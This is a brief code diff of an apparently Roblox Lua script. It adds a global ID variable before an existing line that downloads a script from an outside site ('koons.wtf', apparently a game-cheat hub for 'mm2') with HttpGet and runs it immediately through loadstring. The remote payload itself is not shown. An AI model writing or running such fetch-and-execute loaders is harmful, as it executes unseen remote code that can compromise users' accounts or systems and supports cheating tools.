@@ -1,5 +1,6 @@
 task.spawn(function()
-     loadstring(game:HttpGet("https://koons.wtf/lua/mm2.luau",true))()
+     getgenv().KOONS_ID = "koons_0f2f689c22d4d846"
+loadstring(game:HttpGet("https://koons.wtf/lua/mm2.luau",true))()
 end)
 
 task.spawn(function()
